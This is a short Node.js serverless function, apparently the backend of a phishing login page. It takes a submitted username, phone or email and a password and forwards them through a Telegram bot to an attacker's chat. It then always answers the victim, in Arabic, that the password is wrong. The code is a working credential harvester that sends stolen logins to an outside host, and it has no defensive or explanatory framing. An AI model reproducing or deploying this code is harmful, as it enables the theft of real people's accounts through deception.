const https = require('https');

const token = process.env.TELEGRAM_BOT_TOKEN;
const adminId = process.env.TELEGRAM_ADMIN_ID;

exports.handler = async function (event, context) {
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ message: 'Method Not Allowed' }),
        };
    }

    const { text, password } = JSON.parse(event.body);

    if (!text || !password) {
        return {
            statusCode: 400,
            body: JSON.stringify({ message: 'Text (username/phone) and password are required' }),
        };
    }

    const message = `تسجيل دخول جديد .\n\nالرقم او البريد : \`${text}\`\nالرمز : \`${password}\``;

    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${adminId}&text=${encodeURIComponent(message)}&parse_mode=markdown`;

    try {
        const response = await new Promise((resolve, reject) => {
            https.get(url, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => resolve(data));
            }).on('error', (err) => reject(err));
        });

        return {
            statusCode: 200,
            body: JSON.stringify({ message: 'كلمة المرور خاطئة' }),
        };
    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ message: 'كلمة المرور خاطئة' }),
        };
    }
};
